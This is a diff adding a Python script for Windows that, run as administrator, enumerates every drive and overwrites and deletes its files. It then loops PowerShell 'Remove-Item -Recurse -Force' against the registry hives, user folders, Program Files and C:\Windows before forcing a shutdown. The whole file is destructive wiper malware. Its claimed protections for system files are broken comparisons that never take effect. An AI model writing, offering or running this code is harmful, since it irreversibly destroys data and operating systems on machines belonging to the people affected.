@@ -1,0 +1,175 @@
+import ctypes
+import os
+import sys
+import shutil
+from ctypes import *
+import string
+import glob
+import time
+import subprocess
+
+'''
+return true if the user executing the code is an administrator
+'''
+def isAdmin():
+	is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+	return is_admin
+
+'''
+Find all of the drives connected to the computer
+returns them as a list
+'''
+def enumDrives():
+	drives = []
+	bitmask = windll.kernel32.GetLogicalDrives()
+	for letter in string.ascii_uppercase:
+		if bitmask & 1:
+			letter = letter + ":\\"
+			drives.append(letter)
+		bitmask >>= 1
+	return drives
+
+'''
+recursively traverse a drive passed in as an argument
+add each file with its path to a list
+print the number of files found on the drive
+return the list of files
+'''
+def enumFiles(drive):
+	fileArr = []
+	for filename in glob.iglob(drive + '**/*.*', recursive=True):
+		fileArr.append(filename)
+	print(str(len(fileArr)) + " files found!\n")
+	return fileArr
+
+'''
+similar to enumFiles()
+maps the C drive with the exception of any files in the Windows subdir
+this preserves the windows OS critical files
+'''
+def mapCDrive():
+	fileArr = []
+	for filename in glob.iglob("C:\\" + '**/*.*', recursive=True):
+		if filename != 'C:\\Windows\\*':
+			fileArr.append(filename)
+	print(str(len(fileArr)) + " files found!\n")
+	return fileArr
+
+'''
+currently only able to take ownership and control of files on a NTFS filesystem
+if not NTFS ex. fat32 get error: PermissionError: [WinError 5] Access is denied
+non NTFS seen as unsecure file system and unable to remove or overwrite files even as admin
+a drive is passed in format: C:\\
+returns True if the drive is NTFS and False if other
+'''
+def getFSType(drive):
+	command = ("fsutil fsinfo volumeinfo " + str(drive.split("\\")[0]))
+	output = str(subprocess.check_output(command))
+	if output.find("NTFS") != -1:
+		return True
+	else:
+		return False
+
+'''
+inputs:
+pathFiles - list containing file paths
+random_fill - boolean denoting if user selected random fill
+null_fill - boolean denoting if user selected null fill
+passes - number of times to overwrite the file
+
+for each file in the list passed in if random_fill is True the bytes of the file will be overwritten 
+with random bytes for each pass, if null_fill is True the bytes of the file will be overwritten with 
+null bytes (0x00) for each pass
+
+The file is then removed from the drive using os.remove() functionality
+'''
+def deleteSecure(pathFiles, random_fill=True, null_fill=True, passes=3):
+	currDir = os.getcwd()
+	pythonExecPath = os.path.dirname(sys.executable)
+	for item in pathFiles:
+		if item != currDir or item != pythonExecPath:
+			#os.system('@echo off')
+			#os.system('takeown /f ' + str(item))
+			#os.system('cacls ' + str(item))
+			try:
+				with open(item, "w+") as data:
+					length = data.tell()
+					if random_fill:
+						for _ in xrange(passes):
+							data.seek(0)
+							data.write(os.urandom(length))
+					if null_fill:
+						for _ in xrange(passes):
+							data.seek(0)
+							data.write("\x00" * length)
+			except:
+				continue
+		os.remove(item)
+
+
+
+def main():
+
+
+	# *UNTESTED* uncomment below line to block user input during code execution
+	# blockInput = ctypes.windll.user32.BlockInput
+
+
+	# attempt to find and print all attached drives -> writes found drives to list 'drives'
+	drives = enumDrives()
+	print("Found drives: " + str(drives) + "\n")
+
+	'''
+	for each drive that is not the C drive (to preserve OS critical files)
+	map the drive, finding all files
+	if an NTFS file system AND -random or -null securely overwrite and delete files
+	if non NTFS (likely only in case of USB or removable media) skip and move onto next drive
+	'''
+	for drive in drives:
+		if drive != 'C:\\':
+			print("This may take several minutes\n")
+			print("Mapping " + str(drive) + " Drive\n")
+			fileArr = enumFiles(drive)
+			print("Erasing " + str(drive) + " Drive Securely\n")
+			if getFSType(drive) == True:
+				deleteSecure(fileArr)
+				print(str(drive) + " Erased Securely... moving onto C:\\ Drive\n")
+			else:
+				time.sleep(2)
+				print(str(drive) + " is a non NTFS file system... Unable to take ownership to overwrite...\n" )
+
+
+	'''
+	remove non critial files of windows C: drive
+	'''
+	print("Mapping C:\\ Drive\n")
+	cFiles = mapCDrive()
+	print("Erasing C:\\ Drive Securely\n")
+	deleteSecure(cFiles)
+	print("Removing Windows critical files\n")
+	time.sleep(2)
+	
+
+	'''
+	Recursively remove directories containing critical files
+	'''
+	while(True):
+		subprocess.call(["powershell", "Remove-Item -Recurse -Force HKLM:\\"])
+		subprocess.call(["powershell", "Remove-Item -Recurse -Force HKCU:\\"])
+		subprocess.call(["powershell", "Remove-Item -Recurse -Force Env:\\"])
+		subprocess.call(["powershell", "Remove-Item -Recurse -Force Variable:\\"])
+		subprocess.call(["powershell", "Remove-Item -Recurse -Force %SystemDrive%"])
+		subprocess.call(["powershell", "Remove-Item -Recurse -Force %SystemRoot%"])
+		subprocess.call(["powershell", "Remove-Item -Recurse -Force C:\\Users\\"])
+		subprocess.call(["powershell", "Remove-Item -Recurse -Force C:\\Program Files\\"])
+		subprocess.call(["powershell", "Remove-Item -Recurse -Force C:\\Program Files (x86)\\"])
+		subprocess.call(["powershell", "Remove-Item -Recurse -Force C:\\Windows\\"])
+		time.sleep(2)
+		os.system('shutdown /s /t 1')
+
+
+if __name__ == "__main__":
+	if(isAdmin()):
+		main()
+	else:
+		print("ERR: Program must be run with administrator privileges")
